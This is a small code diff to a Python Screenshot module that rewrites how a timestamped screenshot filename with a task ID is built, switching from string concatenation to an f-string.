@@ -32,7 +32,7 @@ class Screenshot(Module):
 		if not os.path.exists(dump_path):
 			os.makedirs(dump_path)
 
-		filename = "screenshot_"+time.strftime("%Y%m%d-%H%M%S")+"_"+task_id+".png"
+		filename = f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.png"
 		ss_path = os.path.join(dump_path,filename)
 
 		if 'path' in  options:
